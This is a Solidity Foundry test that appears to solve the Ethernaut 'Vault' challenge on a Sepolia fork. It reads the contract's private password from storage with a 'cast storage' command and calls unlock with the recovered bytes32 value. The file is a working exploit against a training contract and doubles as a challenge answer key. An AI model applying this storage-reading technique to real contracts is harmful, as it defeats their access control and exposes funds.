// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/08-Vault/Vault.sol";

contract ContractTest is Test {
    Vault level8 = Vault(payable(0xc50410190937fd733E11938Bd32491999079cf76));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0xc50410190937fd733E11938Bd32491999079cf76),
            "Ethernaut08"
        );
    }

    function testEthernaut08() public {
        // cast storage 0xc50410190937fd733E11938Bd32491999079cf76 1 --rpc-url https://rpc.ankr.com/eth_sepolia
        bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;

        level8.unlock(password);
        assert(level8.locked() == false);
    }

    receive() external payable {}
}
